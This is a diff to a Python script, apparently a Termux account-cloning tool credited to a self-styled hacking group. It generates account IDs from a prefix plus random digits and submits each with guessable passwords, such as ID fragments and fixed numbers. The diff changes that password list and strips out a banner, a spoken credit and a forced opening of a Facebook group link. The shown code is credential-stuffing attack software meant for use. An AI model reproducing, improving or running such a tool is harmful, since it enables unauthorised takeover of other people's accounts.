@@ -4,7 +4,6 @@
 #-------------------[ MAIN-CODE ]-------------------#
 from os import path
 import requests,os
-os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
 import os,base64,zlib,pip,urllib
 try:
         import os,requests,json,time,re,random,sys,uuid,string,subprocess
@@ -100,14 +99,8 @@ import os
 os.system("pkg install espeak")
 os.system("git pull")
 os.system("clear")
-jalan('\033[38;5;46m             SCRIPTED BY SK SHUVOJIT')
-os.system('espeak -a 300 "SCRIPTED BY SK SHUVOJIT"')
 
-jalan('\033[38;5;196mSENIOR ADMIN OF BANGLADESH ANONYMOUS CYBER FORCE')
-os.system('espeak -a 300 "SENIOR ADMIN OF BANGLADESH ANONYMOUS CYBER FORCE"')
 time.sleep(3)
-os.system("xdg-open https://www.facebook.com/groups/167652229652980/?ref=share_group_link")
-time.sleep(7)
 logo=("""\033[38;5;46m
     █████╗ ████████╗ ██████╗ ███╗   ███╗
    ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
@@ -169,7 +162,7 @@ def rndm():
                 print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE');linex()
                 for love in user:
                         ids = code + love 
-                        pasx = [ids,ids[2:],'57273200','59039200','57575751']
+                        pasx = [ids[:6],ids[:8],'57273200']
                         if sumon in ['1','1']:
                         	_BLACK_.submit(_M1_,ids,pasx)
                         if sumon in ['2','2']:
